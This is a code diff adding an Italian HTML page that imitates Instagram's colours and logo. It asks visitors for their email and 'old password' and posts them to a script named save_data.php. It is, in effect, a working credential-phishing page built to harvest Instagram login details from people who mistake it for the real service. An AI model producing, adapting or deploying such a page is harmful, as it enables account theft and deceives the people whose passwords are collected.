@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accesso</title>
+    <style>
+        /* Sfondo con i colori di Instagram */
+        body {
+            background: linear-gradient(135deg, #833AB4, #E1306C, #FD1D1D, #F77737);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+
+        /* Contenitore centrale */
+        .container {
+            background: #FFFAFA;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 300px;
+        }
+
+        /* Immagine sopra il form */
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 10px;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        /* Input stilizzati */
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: #E1306C;
+            outline: none;
+            box-shadow: 0 0 8px rgba(225, 48, 108, 0.5);
+        }
+
+        /* Bottone stilizzato */
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #E1306C;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #C13584;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+       <img src="insta4.jpeg" alt="Logo" class="logo" style="width: 200px; height: auto;">
+
+ <!-- Sostituisci "logo.png" con il tuo file -->
+        <h2>Inserisci i tuoi dati</h2>
+        <form action="save_data.php" method="POST">
+		<p>Inserisci la tua email:
+            <input type="email" name="email" placeholder="Email" required><br>
+			<p>Inserisci vecchia password:
+            <input type="password" name="password" placeholder="Password" required><br>
+            <button type="submit">Invia</button>
+        </form>
+    </div>
+
+</body>
+</html>
